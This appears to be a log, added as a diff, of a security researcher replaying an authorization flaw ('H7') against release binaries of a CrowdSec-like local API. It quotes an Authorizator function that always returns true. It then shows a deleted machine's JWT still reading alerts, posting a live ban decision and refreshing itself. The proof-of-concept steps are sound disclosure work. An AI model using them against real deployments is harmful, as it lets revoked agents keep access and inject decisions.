@@ -1,0 +1,35 @@
+===== H7 REPLAY on official release binaries =====
+version: v1.7.8-63227459
+Codename: alphaga
+version: v1.7.8-63227459
+-- vulnerable code (release tag source, pkg/apiserver/middlewares/v1/jwt.go:240-242):
+func Authorizator(data any, c *gin.Context) bool {
+	return true
+}
+-- cscli machines add agentC (release cscli):
+Machine 'agentC' successfully added to the local API.
+API credentials written to '/tmp/agentC-rel-creds.yaml'.
+-- login agentC:
+HTTP 200
+   token captured: eyJhbGciOiJIUzI1NiIsInR5c...
+-- control: TOKC GET /v1/heartbeat (expect 200):
+HTTP 200
+
+-- cscli machines delete agentC (release cscli):
+level=info msg="machine 'agentC' deleted successfully"
+  agentC rows left: 0
+-- control: fresh login as agentC after deletion (expect refusal):
+HTTP 401
+{"code":401,"message":"ent: machine not found"}
+-- POST-DELETION: TOKC GET /v1/alerts:
+HTTP 200
+[{"capacity":10,"created_at":"2026-11-25T20:32:39Z","decisions":[{"duration":"-7s","id":8,"origin":"crowdsec","scenario":"test/manual","scope":"Ip","simulated":false,"type":"ban","value":"192.0.2.201"}],"events":[{"meta":[{"key":"source_ip","value":"192.0.2.201"}],"timestamp":"2026-11-25 20:32:39 +0000 UTC"}],"events_count":1,"id":8,"labels":null,"leakspeed":"10s","machine_id":"agentA","message":"
+-- POST-DELETION: TOKC POST /v1/alerts (nodsc 192.0.2.203, write attempt):
+HTTP 201
+["10"]
+-- bouncer view of 192.0.2.203 (deleted machine's decision live?):
+[{"duration":"3h59m59s","id":10,"origin":"crowdsec","scenario":"test/manual","scope":"Ip","type":"ban","value":"192.0.2.203"}]
+-- POST-DELETION: TOKC GET /v1/refresh_token:
+HTTP 200
+{"code":200,"expire":"2026-11-25T21:32:47Z","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTU2NDIzNjcsImlkIjoiYWdlbnRDIiwib3JpZ19pYXQiOjE3OTU2Mzg3Nj
+===== END H7 release replay =====
